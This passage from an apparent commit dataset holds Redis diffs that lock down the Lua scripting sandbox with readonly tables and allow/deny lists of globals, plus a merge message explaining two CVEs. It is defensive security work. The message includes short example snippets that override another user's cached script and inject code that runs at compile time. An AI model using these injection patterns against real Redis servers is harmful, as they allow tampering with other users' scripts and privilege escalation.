    \ /* push original globals */\n-    lua_settable(lua, -3);\n-    lua_pushstring(lua,\
    \ \"__newindex\");\n-    lua_pushvalue(lua, LUA_GLOBALSINDEX); /* push original\
    \ globals */\n-    lua_settable(lua, -3);\n-\n-    lua_setmetatable(lua, -2);\n\
    +    ret = C_OK;\n \n-    lua_pop(lua, 1); /* pops the global table */\n+done:\n\
    +    /* restore original globals */\n+    lua_getmetatable(lua, LUA_GLOBALSINDEX);\n\
    +    lua_enablereadonlytable(lua, -1, 0); /* disable global protection */\n+ \
    \   lua_getfield(lua, LUA_REGISTRYINDEX, GLOBALS_API_NAME);\n+    lua_setfield(lua,\
    \ -2, \"__index\");\n+    lua_enablereadonlytable(lua, LUA_GLOBALSINDEX, 1); /*\
    \ enable global protection */\n+    lua_pop(lua, 1); /* pop the metatable */\n\
    \ \n-    return C_OK;\n+    lua_sethook(lua,NULL,0,0); /* Disable hook */\n+ \
    \   luaSaveOnRegistry(lua, REGISTRY_LOAD_CTX_NAME, NULL);\n+    return ret;\n\
    \ }\n \n /*\n@@ -458,8 +426,8 @@ int luaEngineInitEngine() {\n     luaRegisterRedisAPI(lua_engine_ctx->lua);\n\
    \ \n     /* Register the library commands table and fields and store it to registry\
    \ */\n-    lua_pushstring(lua_engine_ctx->lua, LIBRARY_API_NAME);\n-    lua_newtable(lua_engine_ctx->lua);\n\
    +    lua_newtable(lua_engine_ctx->lua); /* load library globals */\n+    lua_newtable(lua_engine_ctx->lua);\
    \ /* load library `redis` table */\n \n     lua_pushstring(lua_engine_ctx->lua,\
    \ \"register_function\");\n     lua_pushcfunction(lua_engine_ctx->lua, luaRegisterFunction);\n\
    @@ -468,11 +436,17 @@ int luaEngineInitEngine() {\n     luaRegisterLogFunction(lua_engine_ctx->lua);\n\
    \     luaRegisterVersion(lua_engine_ctx->lua);\n \n-    lua_settable(lua_engine_ctx->lua,\
    \ LUA_REGISTRYINDEX);\n+    luaSetErrorMetatable(lua_engine_ctx->lua);\n+    lua_setfield(lua_engine_ctx->lua,\
    \ -2, REDIS_API_NAME);\n+\n+    luaSetErrorMetatable(lua_engine_ctx->lua);\n+\
    \    luaSetTableProtectionRecursively(lua_engine_ctx->lua); /* protect load library\
    \ globals */\n+    lua_setfield(lua_engine_ctx->lua, LUA_REGISTRYINDEX, LIBRARY_API_NAME);\n\
    \ \n     /* Save error handler to registry */\n     lua_pushstring(lua_engine_ctx->lua,\
    \ REGISTRY_ERROR_HANDLER_NAME);\n     char *errh_func =       \"local dbg = debug\\\
    n\"\n+                            \"debug = nil\\n\"\n                       \
    \      \"local error_handler = function (err)\\n\"\n                         \
    \    \"  local i = dbg.getinfo(2,'nSl')\\n\"\n                             \"\
    \  if i and i.what == 'C' then\\n\"\n@@ -492,17 +466,30 @@ int luaEngineInitEngine()\
    \ {\n     lua_pcall(lua_engine_ctx->lua,0,1,0);\n     lua_settable(lua_engine_ctx->lua,\
    \ LUA_REGISTRYINDEX);\n \n-    /* Save global protection to registry */\n-   \
    \ luaRegisterGlobalProtectionFunction(lua_engine_ctx->lua);\n-\n-    /* Set global\
    \ protection on globals */\n     lua_pushvalue(lua_engine_ctx->lua, LUA_GLOBALSINDEX);\n\
    -    luaSetGlobalProtection(lua_engine_ctx->lua);\n+    luaSetErrorMetatable(lua_engine_ctx->lua);\n\
    +    luaSetTableProtectionRecursively(lua_engine_ctx->lua); /* protect globals\
    \ */\n     lua_pop(lua_engine_ctx->lua, 1);\n \n+    /* Save default globals to\
    \ registry */\n+    lua_pushvalue(lua_engine_ctx->lua, LUA_GLOBALSINDEX);\n+ \
    \   lua_setfield(lua_engine_ctx->lua, LUA_REGISTRYINDEX, GLOBALS_API_NAME);\n\
    +\n     /* save the engine_ctx on the registry so we can get it from the Lua interpreter\
    \ */\n     luaSaveOnRegistry(lua_engine_ctx->lua, REGISTRY_ENGINE_CTX_NAME, lua_engine_ctx);\n\
    \ \n+    /* Create new empty table to be the new globals, we will be able to control\
    \ the real globals\n+     * using metatable */\n+    lua_newtable(lua_engine_ctx->lua);\
    \ /* new globals */\n+    lua_newtable(lua_engine_ctx->lua); /* new globals metatable\
    \ */\n+    lua_pushvalue(lua_engine_ctx->lua, LUA_GLOBALSINDEX);\n+    lua_setfield(lua_engine_ctx->lua,\
    \ -2, \"__index\");\n+    lua_enablereadonlytable(lua_engine_ctx->lua, -1, 1);\
    \ /* protect the metatable */\n+    lua_setmetatable(lua_engine_ctx->lua, -2);\n\
    +    lua_enablereadonlytable(lua_engine_ctx->lua, -1, 1); /* protect the new global\
    \ table */\n+    lua_replace(lua_engine_ctx->lua, LUA_GLOBALSINDEX); /* set new\
    \ global table as the new globals */\n+\n+\n     engine *lua_engine = zmalloc(sizeof(*lua_engine));\n\
    \     *lua_engine = (engine) {\n         .engine_ctx = lua_engine_ctx,"
  - "--- a/src/script_lua.c\n+++ b/src/script_lua.c\n@@ -41,6 +41,97 @@\n #include\
    \ <ctype.h>\n #include <math.h>\n \n+/* Globals that are added by the Lua libraries\
    \ */\n+static char *libraries_allow_list[] = {\n+    \"string\",\n+    \"cjson\"\
    ,\n+    \"bit\",\n+    \"cmsgpack\",\n+    \"math\",\n+    \"table\",\n+    \"\
    struct\",\n+    NULL,\n+};\n+\n+/* Redis Lua API globals */\n+static char *redis_api_allow_list[]\
    \ = {\n+    \"redis\",\n+    \"__redis__err__handler\", /* error handler for eval,\
    \ currently located on globals.\n+                                Should move\
    \ to registry. */\n+    NULL,\n+};\n+\n+/* Lua builtins */\n+static char *lua_builtins_allow_list[]\
    \ = {\n+    \"xpcall\",\n+    \"tostring\",\n+    \"getfenv\",\n+    \"setmetatable\"\
    ,\n+    \"next\",\n+    \"assert\",\n+    \"tonumber\",\n+    \"rawequal\",\n\
    +    \"collectgarbage\",\n+    \"getmetatable\",\n+    \"rawset\",\n+    \"pcall\"\
    ,\n+    \"coroutine\",\n+    \"type\",\n+    \"_G\",\n+    \"select\",\n+    \"\
    unpack\",\n+    \"gcinfo\",\n+    \"pairs\",\n+    \"rawget\",\n+    \"loadstring\"\
    ,\n+    \"ipairs\",\n+    \"_VERSION\",\n+    \"setfenv\",\n+    \"load\",\n+\
    \    \"error\",\n+    NULL,\n+};\n+\n+/* Lua builtins which are not documented\
    \ on the Lua documentation */\n+static char *lua_builtins_not_documented_allow_list[]\
    \ = {\n+    \"newproxy\",\n+    NULL,\n+};\n+\n+/* Lua builtins which are allowed\
    \ on initialization but will be removed right after */\n+static char *lua_builtins_removed_after_initialization_allow_list[]\
    \ = {\n+    \"debug\", /* debug will be set to nil after the error handler will\
    \ be created */\n+    NULL,\n+};\n+\n+/* Those allow lists was created from the\
    \ globals that was\n+ * available to the user when the allow lists was first introduce.\n\
    + * Because we do not want to break backward compatibility we keep\n+ * all the\
    \ globals. The allow lists will prevent us from accidentally\n+ * creating unwanted\
    \ globals in the future.\n+ *\n+ * Also notice that the allow list is only checked\
    \ on start time,\n+ * after that the global table is locked so not need to check\
    \ anything.*/\n+static char **allow_lists[] = {\n+    libraries_allow_list,\n\
    +    redis_api_allow_list,\n+    lua_builtins_allow_list,\n+    lua_builtins_not_documented_allow_list,\n\
    +    lua_builtins_removed_after_initialization_allow_list,\n+    NULL,\n+};\n\
    +\n+/* Deny list contains elements which we know we do not want to add to globals\n\
    + * and there is no need to print a warning message form them. We will print a\n\
    + * log message only if an element was added to the globals and the element is\n\
    + * not on the allow list nor on the back list. */\n+static char *deny_list[]\
    \ = {\n+    \"dofile\",\n+    \"loadfile\",\n+    \"print\",\n+    NULL,\n+};\n\
    +\n static int redis_math_random (lua_State *L);\n static int redis_math_randomseed\
    \ (lua_State *L);\n static void redisProtocolToLuaType_Int(void *ctx, long long\
    \ val, const char *proto, size_t proto_len);\n@@ -1113,15 +1204,6 @@ static void\
    \ luaLoadLibraries(lua_State *lua) {\n #endif\n }\n \n-/* Remove a functions that\
    \ we don't want to expose to the Redis scripting\n- * environment. */\n-static\
    \ void luaRemoveUnsupportedFunctions(lua_State *lua) {\n-    lua_pushnil(lua);\n\
    -    lua_setglobal(lua,\"loadfile\");\n-    lua_pushnil(lua);\n-    lua_setglobal(lua,\"\
    dofile\");\n-}\n-\n /* Return sds of the string value located on stack at the\
    \ given index.\n  * Return NULL if the value is not a string. */\n sds luaGetStringSds(lua_State\
    \ *lua, int index) {\n@@ -1135,107 +1217,120 @@ sds luaGetStringSds(lua_State\
    \ *lua, int index) {\n     return str_sds;\n }\n \n-/* This function installs\
    \ metamethods in the global table _G that prevent\n- * the creation of globals\
    \ accidentally.\n- *\n- * It should be the last to be called in the scripting\
    \ engine initialization\n- * sequence, because it may interact with creation of\
    \ globals.\n- *\n- * On Legacy Lua (eval) we need to check 'w ~= \\\"main\\\"\
    ' otherwise we will not be able\n- * to create the global 'function <sha> ()'\
    \ variable. On Functions Lua engine we do not use\n- * this trick so it's not\
    \ needed. */\n-void luaEnableGlobalsProtection(lua_State *lua, int is_eval) {\n\
    -    char *s[32];\n-    sds code = sdsempty();\n-    int j = 0;\n-\n-    /* strict.lua\
    \ from: http://metalua.luaforge.net/src/lib/strict.lua.html.\n-     * Modified\
    \ to be adapted to Redis. */\n-    s[j++]=\"local dbg=debug\\n\";\n-    s[j++]=\"\
    local mt = {}\\n\";\n-    s[j++]=\"setmetatable(_G, mt)\\n\";\n-    s[j++]=\"\
    mt.__newindex = function (t, n, v)\\n\";\n-    s[j++]=\"  if dbg.getinfo(2) then\\\
    n\";\n-    s[j++]=\"    local w = dbg.getinfo(2, \\\"S\\\").what\\n\";\n-    s[j++]=\
    \     is_eval ? \"    if w ~= \\\"main\\\" and w ~= \\\"C\\\" then\\n\" : \" \
    \   if w ~= \\\"C\\\" then\\n\";\n-    s[j++]=\"      error(\\\"Script attempted\
    \ to create global variable '\\\"..tostring(n)..\\\"'\\\", 2)\\n\";\n-    s[j++]=\"\
    \    end\\n\";\n-    s[j++]=\"  end\\n\";\n-    s[j++]=\"  rawset(t, n, v)\\n\"\
    ;\n-    s[j++]=\"end\\n\";\n-    s[j++]=\"mt.__index = function (t, n)\\n\";\n\
    -    s[j++]=\"  if dbg.getinfo(2) and dbg.getinfo(2, \\\"S\\\").what ~= \\\"C\\\
    \" then\\n\";\n-    s[j++]=\"    error(\\\"Script attempted to access nonexistent\
    \ global variable '\\\"..tostring(n)..\\\"'\\\", 2)\\n\";\n-    s[j++]=\"  end\\\
    n\";\n-    s[j++]=\"  return rawget(t, n)\\n\";\n-    s[j++]=\"end\\n\";\n-  \
    \  s[j++]=\"debug = nil\\n\";\n-    s[j++]=NULL;\n-\n-    for (j = 0; s[j] !=\
    \ NULL; j++) code = sdscatlen(code,s[j],strlen(s[j]));\n-    luaL_loadbuffer(lua,code,sdslen(code),\"\
    @enable_strict_lua\");\n-    lua_pcall(lua,0,0,0);\n-    sdsfree(code);\n+static\
    \ int luaProtectedTableError(lua_State *lua) {\n+    int argc = lua_gettop(lua);\n\
    +    if (argc != 2) {\n+        serverLog(LL_WARNING, \"malicious code trying\
    \ to call luaProtectedTableError with wrong arguments\");\n+        luaL_error(lua,\
    \ \"Wrong number of arguments to luaProtectedTableError\");\n+    }\n+    if (!lua_isstring(lua,\
    \ -1) && !lua_isnumber(lua, -1)) {\n+        luaL_error(lua, \"Second argument\
    \ to luaProtectedTableError must be a string or number\");\n+    }\n+    const\
    \ char *variable_name = lua_tostring(lua, -1);\n+    luaL_error(lua, \"Script\
    \ attempted to access nonexistent global variable '%s'\", variable_name);\n+ \
    \   return 0;\n }\n \n-/* Create a global protection function and put it to registry.\n\
    - * This need to be called once in the lua_State lifetime.\n- * After called it\
    \ is possible to use luaSetGlobalProtection\n- * to set global protection on a\
    \ give table.\n+/* Set a special metatable on the table on the top of the stack.\n\
    + * The metatable will raise an error if the user tries to fetch\n+ * an un-existing\
    \ value.\n  *\n  * The function assumes the Lua stack have a least enough\n  *\
    \ space to push 2 element, its up to the caller to verify\n- * this before calling\
    \ this function.\n- *\n- * Notice, the difference between this and luaEnableGlobalsProtection\n\
    - * is that luaEnableGlobalsProtection is enabling global protection\n- * on the\
    \ current Lua globals. This registering a global protection\n- * function that\
    \ later can be applied on any table. */\n-void luaRegisterGlobalProtectionFunction(lua_State\
    \ *lua) {\n-    lua_pushstring(lua, REGISTRY_SET_GLOBALS_PROTECTION_NAME);\n-\
    \    char *global_protection_func =       \"local dbg = debug\\n\"\n-        \
    \                                 \"local globals_protection = function (t)\\\
    n\"\n-                                         \"   local mt = {}\\n\"\n-    \
    \                                     \"   setmetatable(t, mt)\\n\"\n-       \
    \                                  \"   mt.__newindex = function (t, n, v)\\n\"\
    \n-                                         \"       if dbg.getinfo(2) then\\\
    n\"\n-                                         \"           local w = dbg.getinfo(2,\
    \ \\\"S\\\").what\\n\"\n-                                         \"         \
    \  if w ~= \\\"C\\\" then\\n\"\n-                                         \" \
    \              error(\\\"Script attempted to create global variable '\\\"..tostring(n)..\\\
    \"'\\\", 2)\\n\"\n-                                         \"           end\"\
    \n-                                         \"       end\"\n-                \
    \                         \"       rawset(t, n, v)\\n\"\n-                   \
    \                      \"   end\\n\"\n-                                      \
    \   \"   mt.__index = function (t, n)\\n\"\n-                                \
    \         \"       if dbg.getinfo(2) and dbg.getinfo(2, \\\"S\\\").what ~= \\\"\
    C\\\" then\\n\"\n-                                         \"           error(\\\
    \"Script attempted to access nonexistent global variable '\\\"..tostring(n)..\\\
    \"'\\\", 2)\\n\"\n-                                         \"       end\\n\"\n\
    -                                         \"       return rawget(t, n)\\n\"\n\
    -                                         \"   end\\n\"\n-                   \
    \                      \"end\\n\"\n-                                         \"\
    return globals_protection\";\n-    int res = luaL_loadbuffer(lua, global_protection_func,\
    \ strlen(global_protection_func), \"@global_protection_def\");\n-    serverAssert(res\
    \ == 0);\n-    res = lua_pcall(lua,0,1,0);\n-    serverAssert(res == 0);\n-  \
    \  lua_settable(lua, LUA_REGISTRYINDEX);\n+ * this before calling this function.\
    \ */\n+void luaSetErrorMetatable(lua_State *lua) {\n+    lua_newtable(lua); /*\
    \ push metatable */\n+    lua_pushcfunction(lua, luaProtectedTableError); /* push\
    \ get error handler */\n+    lua_setfield(lua, -2, \"__index\");\n+    lua_setmetatable(lua,\
    \ -2);\n }\n \n-/* Set global protection on a given table.\n- * The table need\
    \ to be located on the top of the lua stack.\n- * After called, it will no longer\
    \ be possible to set\n- * new items on the table. The function is not removing\n\
    - * the table from the top of the stack!\n+static int luaNewIndexAllowList(lua_State\
    \ *lua) {\n+    int argc = lua_gettop(lua);\n+    if (argc != 3) {\n+        serverLog(LL_WARNING,\
    \ \"malicious code trying to call luaProtectedTableError with wrong arguments\"\
    );\n+        luaL_error(lua, \"Wrong number of arguments to luaNewIndexAllowList\"\
    );\n+    }\n+    if (!lua_istable(lua, -3)) {\n+        luaL_error(lua, \"first\
    \ argument to luaNewIndexAllowList must be a table\");\n+    }\n+    if (!lua_isstring(lua,\
    \ -2) && !lua_isnumber(lua, -2)) {\n+        luaL_error(lua, \"Second argument\
    \ to luaNewIndexAllowList must be a string or number\");\n+    }\n+    const char\
    \ *variable_name = lua_tostring(lua, -2);\n+    /* check if the key is in our\
    \ allow list */\n+\n+    char ***allow_l = allow_lists;\n+    for (; *allow_l\
    \ ; ++allow_l){\n+        char **c = *allow_l;\n+        for (; *c ; ++c) {\n\
    +            if (strcmp(*c, variable_name) == 0) {\n+                break;\n\
    +            }\n+        }\n+        if (*c) {\n+            break;\n+       \
    \ }\n+    }\n+    if (!*allow_l) {\n+        /* Search the value on the back list,\
    \ if its there we know that it was removed\n+         * on purpose and there is\
    \ no need to print a warning. */\n+        char **c = deny_list;\n+        for\
    \ ( ; *c ; ++c) {\n+            if (strcmp(*c, variable_name) == 0) {\n+     \
    \           break;\n+            }\n+        }\n+        if (!*c) {\n+       \
    \     serverLog(LL_WARNING, \"A key '%s' was added to Lua globals which is not\
    \ on the globals allow list nor listed on the deny list.\", variable_name);\n\
    +        }\n+    } else {\n+        lua_rawset(lua, -3);\n+    }\n+    return\
    \ 0;\n+}\n+\n+/* Set a metatable with '__newindex' function that verify that\n\
    + * the new index appears on our globals while list.\n  *\n- * The function assumes\
    \ the Lua stack have a least enough\n- * space to push 2 element, its up to the\
    \ caller to verify\n- * this before calling this function. */\n-void luaSetGlobalProtection(lua_State\
    \ *lua) {\n-    lua_pushstring(lua, REGISTRY_SET_GLOBALS_PROTECTION_NAME);\n-\
    \    lua_gettable(lua, LUA_REGISTRYINDEX);\n-    lua_pushvalue(lua, -2);\n-  \
    \  int res = lua_pcall(lua, 1, 0, 0);\n-    serverAssert(res == 0);\n+ * The metatable\
    \ is set on the table which located on the top\n+ * of the stack.\n+ */\n+void\
    \ luaSetAllowListProtection(lua_State *lua) {\n+    lua_newtable(lua); /* push\
    \ metatable */\n+    lua_pushcfunction(lua, luaNewIndexAllowList); /* push get\
    \ error handler */\n+    lua_setfield(lua, -2, \"__newindex\");\n+    lua_setmetatable(lua,\
    \ -2);\n+}\n+\n+/* Set the readonly flag on the table located on the top of the\
    \ stack\n+ * and recursively call this function on each table located on the original\n\
    + * table.  Also, recursively call this function on the metatables.*/\n+void luaSetTableProtectionRecursively(lua_State\
    \ *lua) {\n+    /* This protect us from a loop in case we already visited the\
    \ table\n+     * For example, globals has '_G' key which is pointing back to globals.\
    \ */\n+    if (lua_isreadonlytable(lua, -1)) {\n+        return;\n+    }\n+\n\
    +    /* protect the current table */\n+    lua_enablereadonlytable(lua, -1, 1);\n\
    +\n+    lua_checkstack(lua, 2);\n+    lua_pushnil(lua); /* Use nil to start iteration.\
    \ */\n+    while (lua_next(lua,-2)) {\n+        /* Stack now: table, key, value\
    \ */\n+        if (lua_istable(lua, -1)) {\n+            luaSetTableProtectionRecursively(lua);\n\
    +        }\n+        lua_pop(lua, 1);\n+    }\n+\n+    /* protect the metatable\
    \ if exists */\n+    if (lua_getmetatable(lua, -1)) {\n+        luaSetTableProtectionRecursively(lua);\n\
    +        lua_pop(lua, 1); /* pop the metatable */\n+    }\n }\n \n void luaRegisterVersion(lua_State*\
    \ lua) {\n@@ -1272,8 +1367,11 @@ void luaRegisterLogFunction(lua_State* lua) {\n\
    \ }\n \n void luaRegisterRedisAPI(lua_State* lua) {\n+    lua_pushvalue(lua, LUA_GLOBALSINDEX);\n\
    +    luaSetAllowListProtection(lua);\n+    lua_pop(lua, 1);\n+\n     luaLoadLibraries(lua);\n\
    -    luaRemoveUnsupportedFunctions(lua);\n \n     lua_pushcfunction(lua,luaRedisPcall);\n\
    \     lua_setglobal(lua, \"pcall\");\n@@ -1504,9 +1602,19 @@ void luaCallFunction(scriptRunCtx*\
    \ run_ctx, lua_State *lua, robj** keys, size_t\n      * EVAL received. */\n  \
    \   luaCreateArray(lua,keys,nkeys);\n     /* On eval, keys and arguments are globals.\
    \ */\n-    if (run_ctx->flags & SCRIPT_EVAL_MODE) lua_setglobal(lua,\"KEYS\");\n\
    +    if (run_ctx->flags & SCRIPT_EVAL_MODE){\n+        /* open global protection\
    \ to set KEYS */\n+        lua_enablereadonlytable(lua, LUA_GLOBALSINDEX, 0);\n\
    +        lua_setglobal(lua,\"KEYS\");\n+        lua_enablereadonlytable(lua, LUA_GLOBALSINDEX,\
    \ 1);\n+    }\n     luaCreateArray(lua,args,nargs);\n-    if (run_ctx->flags &\
    \ SCRIPT_EVAL_MODE) lua_setglobal(lua,\"ARGV\");\n+    if (run_ctx->flags & SCRIPT_EVAL_MODE){\n\
    +        /* open global protection to set ARGV */\n+        lua_enablereadonlytable(lua,\
    \ LUA_GLOBALSINDEX, 0);\n+        lua_setglobal(lua,\"ARGV\");\n+        lua_enablereadonlytable(lua,\
    \ LUA_GLOBALSINDEX, 1);\n+    }\n \n     /* At this point whether this script\
    \ was never seen before or if it was\n      * already defined, we can call it."
  commit_message: "Merge pull request #10651 from oranagra/meir_lua_readonly_tables\n\
    \n# Lua readonly tables\r\nThe PR adds support for readonly tables on Lua to prevent\
    \ security vulnerabilities:\r\n* (CVE-2022-24736) An attacker attempting to load\
    \ a specially crafted Lua script\r\n  can cause NULL pointer dereference which\
    \ will result with a crash of the\r\n  redis-server process. This issue affects\
    \ all versions of Redis.\r\n* (CVE-2022-24735) By exploiting weaknesses in the\
    \ Lua script execution\r\n  environment, an attacker with access to Redis can\
    \ inject Lua code that will\r\n  execute with the (potentially higher) privileges\
    \ of another Redis user.\r\n\r\nThe PR is spitted into 4 commits.\r\n\r\n### Change\
    \ Lua to support readonly tables\r\n\r\nThis PR modifies the Lua interpreter code\
    \ to support a new flag on tables. The new flag indicating that the table is readonly\
    \ and any attempt to perform any writes on such a table will result in an error.\
    \ The new feature can be turned off and on using the new `lua_enablereadonlytable`\
    \ Lua API. The new API can be used **only** from C code. Changes to support this\
    \ feature was taken from https://luau-lang.org/\r\n\r\n### Change eval script\
    \ to set user code on Lua registry\r\n\r\nToday, Redis wrap the user Lua code\
    \ with a Lua function. For example, assuming the user code is:\r\n\r\n```\r\n\
    return redis.call('ping')\r\n```\r\n\r\nThe actual code that would have sent to\
    \ the Lua interpreter was:\r\n\r\n```\r\nf_b3a02c833904802db9c34a3cf1292eee3246df3c()\
    \ return redis.call('ping') end\r\n```\r\n\r\nThe warped code would have been\
    \ saved on the global dictionary with the following name: `f_<script sha>` (in\
    \ our example `f_b3a02c833904802db9c34a3cf1292eee3246df3c`). This approach allows\
    \ one user to easily override the implementation of another user code, example:\r\
    \n\r\n```\r\nf_b3a02c833904802db9c34a3cf1292eee3246df3c = function() return 'hacked'\
    \ end\r\n```\r\n\r\nRunning the above code will cause `evalsha b3a02c833904802db9c34a3cf1292eee3246df3c\
    \ 0` to return `hacked` although it should have returned `pong`. Another disadvantage\
    \ is that Redis basically runs code on the loading (compiling) phase without been\
    \ aware of it. User can do code injection like this:\r\n\r\n```\r\nreturn 1 end\
    \ <run code on compling phase> function() return 1\r\n```\r\n\r\nThe warped code\
    \ will look like this and the entire `<run code on compiling phase>` block will\
    \ run outside of eval or evalsha context:\r\n\r\n```\r\nf_<sha>() return 1 end\
    \ <run code on compling phase> function() return 1 end\r\n```\r\n\r\nThe commits\
    \ puts the user code on a special Lua table called the registry. This table is\
    \ not accessible to the user so it can not be manipulated by him. Also there is\
    \ no longer a need to warp the user code so there is no risk in code injection\
    \ which will cause running code in the wrong context.\r\n\r\n### Use `lua_enablereadonlytable`\
    \ to protect global tables on eval and function\r\n\r\nThe commit uses the new\
    \ `lua_enablereadonlytable` Lua API to protect the global tables of both evals\
    \ scripts and functions. For eval scripts, the implementation is easy, We simply\
    \ call `lua_enablereadonlytable` on the global table to turn it into a readonly\
    \ table.\r\n\r\nOn functions its more complected, we want to be able to switch\
    \ globals between load run and function run. To achieve this, we create a new\
    \ empty table that acts as the globals table for function, we control the actual\
    \ globals using metatable manipulations. Notice that even if the user gets a pointer\
    \ to the original tables, all the tables are set to be readonly (using `lua_enablereadonlytable`\
    \ Lua API) so he can not change them. The following better explains the solution:\r\
    \n\r\n```\r\nGlobal table {} <- global table metatable {.__index = __real_globals__}\r\
    \n```\r\n\r\nThe `__real_globals__` is depends on the run context (function load\
    \ or function call).\r\n\r\nWhy is this solution needed and its not enough to\
    \ simply switch globals? When we run in the context of function load and create\
    \ our functions, our function gets the current globals that was set when they\
    \ were created. Replacing the globals after the creation will not effect them.\
    \ This is why this trick it mandatory.\r\n\r\n### Protect the rest of the global\
    \ API and add an allowed list to the provided API\r\n\r\nThe allowed list is done\
    \ by setting a metatable on the global table before initialising any library.\
    \ The metatable set the `__newindex` field to a function that check the allowed\
    \ list before adding the field to the table. Fields which is not on the\r\nallowed\
    \ list are simply ignored.\r\n\r\nAfter initialisation phase is done we protect\
    \ the global table and each table that might be reachable from the global table.\
    \ For each table we also protect the table metatable if exists.\r\n\r\n### Performance\r\
    \n\r\nPerformance tests was done on a private computer and its only purpose is\
    \ to show that this fix is not causing any performance regression.\r\n\r\ncase\
    \ 1: `return redis.call('ping')`\r\ncase 2: `for i=1,10000000 do redis.call('ping')\
    \ end`\r\n\r\n|                             | Unstable eval | Unstable function\
    \ | lua_readonly_tables eval | lua_readonly_tables function |\r\n|-----------------------------|---------------|-------------------|--------------------------|------------------------------|\r\
    \n| case1 ops/sec               | 235904.70     | 236406.62         | 232180.16\
    \               | 230574.14                   |\r\n| case1 avg latency ms    \
    \    | 0.175         | 0.164             | 0.178                    | 0.149  \
    \                      |\r\n| case2 total time in seconds | 3.373         | 3.444s\
    \            | 3.268                   | 3.278                        |\r\n\r\n\
    ### Breaking changes\r\n\r\n* `print` function was removed from Lua because it\
    \ can potentially cause the Redis processes to get stuck (if no one reads from\
    \ stdout). Users should use redis.log. An alternative is to override the `print`\
    \ implementation and print the message to the log file.\r\n\r\nAll the work by\
    \ @MeirShpilraien, i'm just publishing it."
  commit_sha: 89772ed827209c3dca376644498a235ef3edf692
  repo_name: redis/redis
- commit_diff:
  - "--- a/alloc.c\n+++ b/alloc.c\n@@ -68,6 +68,10 @@ void *hi_malloc(size_t size)\
    \ {\n }\n \n void *hi_calloc(size_t nmemb, size_t size) {\n+    /* Overflow check\
    \ as the user can specify any arbitrary allocator */\n+    if (SIZE_MAX / size\
    \ < nmemb)\n+        return NULL;\n+\n     return hiredisAllocFns.callocFn(nmemb,\
    \ size);\n }\n "
  - "--- a/async.c\n+++ b/async.c\n@@ -47,14 +47,19 @@\n \n #include \"async_private.h\"\
    \n \n+#ifdef NDEBUG\n+#undef assert\n+#define assert(e) (void)(e)\n+#endif\n+\n\
    \ /* Forward declarations of hiredis.c functions */\n int __redisAppendCommand(redisContext\
    \ *c, const char *cmd, size_t len);\n void __redisSetError(redisContext *c, int\
    \ type, const char *str);\n \n /* Functions managing dictionary of callbacks for\
    \ pub/sub. */\n static unsigned int callbackHash(const void *key) {\n     return\
    \ dictGenHashFunction((const unsigned char *)key,\n-                         \
    \      hi_sdslen((const hisds)key));\n+                               sdslen((const\
    \ sds)key));\n }\n \n static void *callbackValDup(void *privdata, const void *src)\
    \ {\n@@ -73,15 +78,15 @@ static int callbackKeyCompare(void *privdata, const void\
    \ *key1, const void *key2\n     int l1, l2;\n     ((void) privdata);\n \n-   \
    \ l1 = hi_sdslen((const hisds)key1);\n-    l2 = hi_sdslen((const hisds)key2);\n\
    +    l1 = sdslen((const sds)key1);\n+    l2 = sdslen((const sds)key2);\n     if\
    \ (l1 != l2) return 0;\n     return memcmp(key1,key2,l1) == 0;\n }\n \n static\
    \ void callbackKeyDestructor(void *privdata, void *key) {\n     ((void) privdata);\n\
    -    hi_sdsfree((hisds)key);\n+    sdsfree((sds)key);\n }\n \n static void callbackValDestructor(void\
    \ *privdata, void *val) {\n@@ -139,8 +144,8 @@ static redisAsyncContext *redisAsyncInitialize(redisContext\
    \ *c) {\n \n     ac->replies.head = NULL;\n     ac->replies.tail = NULL;\n-  \
    \  ac->sub.invalid.head = NULL;\n-    ac->sub.invalid.tail = NULL;\n+    ac->sub.replies.head\
    \ = NULL;\n+    ac->sub.replies.tail = NULL;\n     ac->sub.channels = channels;\n\
    \     ac->sub.patterns = patterns;\n \n@@ -301,36 +306,28 @@ static void __redisRunPushCallback(redisAsyncContext\
    \ *ac, redisReply *reply) {\n static void __redisAsyncFree(redisAsyncContext *ac)\
    \ {\n     redisContext *c = &(ac->c);\n     redisCallback cb;\n-    dictIterator\
    \ *it;\n+    dictIterator it;\n     dictEntry *de;\n \n     /* Execute pending\
    \ callbacks with NULL reply. */\n     while (__redisShiftCallback(&ac->replies,&cb)\
    \ == REDIS_OK)\n         __redisRunCallback(ac,&cb,NULL);\n-\n-    /* Execute\
    \ callbacks for invalid commands */\n-    while (__redisShiftCallback(&ac->sub.invalid,&cb)\
    \ == REDIS_OK)\n+    while (__redisShiftCallback(&ac->sub.replies,&cb) == REDIS_OK)\n\
    \         __redisRunCallback(ac,&cb,NULL);\n \n     /* Run subscription callbacks\
    \ with NULL reply */\n     if (ac->sub.channels) {\n-        it = dictGetIterator(ac->sub.channels);\n\
    -        if (it != NULL) {\n-            while ((de = dictNext(it)) != NULL)\n\
    -                __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n-         \
    \   dictReleaseIterator(it);\n-        }\n+        dictInitIterator(&it,ac->sub.channels);\n\
    +        while ((de = dictNext(&it)) != NULL)\n+            __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n\
    \ \n         dictRelease(ac->sub.channels);\n     }\n \n     if (ac->sub.patterns)\
    \ {\n-        it = dictGetIterator(ac->sub.patterns);\n-        if (it != NULL)\
    \ {\n-            while ((de = dictNext(it)) != NULL)\n-                __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n\
    -            dictReleaseIterator(it);\n-        }\n+        dictInitIterator(&it,ac->sub.patterns);\n\
    +        while ((de = dictNext(&it)) != NULL)\n+            __redisRunCallback(ac,dictGetEntryVal(de),NULL);\n\
    \ \n         dictRelease(ac->sub.patterns);\n     }\n@@ -418,12 +415,13 @@ static\
    \ int __redisGetSubscribeCallback(redisAsyncContext *ac, redisReply *reply,\n\
    \     dictEntry *de;\n     int pvariant;\n     char *stype;\n-    hisds sname;\n\
    +    sds sname;\n \n-    /* Custom reply functions are not supported for pub/sub.\
    \ This will fail\n-     * very hard when they are used... */\n-    if (reply->type\
    \ == REDIS_REPLY_ARRAY || reply->type == REDIS_REPLY_PUSH) {\n-        assert(reply->elements\
    \ >= 2);\n+    /* Match reply with the expected format of a pushed message.\n\
    +     * The type and number of elements (3 to 4) are specified at:\n+     * https://redis.io/topics/pubsub#format-of-pushed-messages\
    \ */\n+    if ((reply->type == REDIS_REPLY_ARRAY && !(c->flags & REDIS_SUPPORTS_PUSH)\
    \ && reply->elements >= 3) ||\n+        reply->type == REDIS_REPLY_PUSH) {\n \
